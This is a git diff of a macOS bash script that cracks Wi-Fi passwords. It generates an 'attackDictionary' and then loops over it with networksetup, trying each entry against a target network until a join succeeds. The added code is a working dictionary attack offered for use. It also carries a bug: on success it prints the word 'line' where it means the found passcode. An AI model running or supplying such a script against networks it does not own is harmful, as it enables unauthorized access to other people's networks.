@@ -1,7 +1,7 @@
 #!/bin/bash
 function prompt() {
   echo "Enter the mode from the following options:"
-  echo "1. fast cracking (numbers only)"
+  echo "1. fast cracking (numbers only up to 8 digits)"
   echo "2. comprehensive cracking (numbers and letters)"
   return
 }
@@ -48,5 +48,29 @@ done
 
 echo
 echo "The internet's name is: $NAME"
+echo "Generating attackDictionary. It might take couple of hours. Please wait."
+echo "You might want to download your own dictionary and rename it to attackDictionary.txt"
+generator
+
+networksetup -setairportpower en1 on
+
+echo
+echo "Start cracking"
+
+while read line; do
+  results=$(networksetup -setairportnetwork en1 "$NAME" $line| grep "Failed")
+  if [ -z "$results" ]; then
+    echo -n "crack successfully, the passcode is: "
+    echo "line"
+    break
+  else
+   echo "Failed. Please wait"
+  fi
+
+done < "attackDictionary.txt"
+
+
+
+
 
 
